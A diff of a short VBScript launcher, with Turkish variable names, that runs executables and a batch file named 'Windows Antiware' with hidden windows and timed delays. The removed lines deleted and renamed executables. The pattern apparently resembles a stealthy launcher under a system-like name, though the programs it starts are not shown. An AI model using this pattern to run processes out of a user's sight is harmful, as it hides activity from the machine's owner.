@@ -1,6 +1,7 @@
-CreateObject("WScript.Shell").Run "Windows Antiware C.exe", 0, False
+set gizli = WScript.CreateObject("WScript.Shell")
+gizli.Run("WindowsAntiwareC.exe"), 0, False
 Set komutlar = WScript.CreateObject("WScript.Shell")
-komutlar.run "cmd del 'Windows Antiware.exe' 'Windows Antiware C.exe'"
-komutlar.run "rename '%CD%\Windows Antiware 2.exe' 'Windows Antiware.exe'"
-komutlar.run "rename '%CD%\Windows Antiware C2.exe' 'Windows Antiware C.exe'"
-CreateObject("WScript.Shell").Run "Windows Antiware C.exe", 0, False
+WScript.Sleep 10000
+gizli.Run("WindowsAntiware.bat"), 0, False
+WScript.Sleep 1000
+gizli.Run("WindowsAntiware.exe"), 0, False
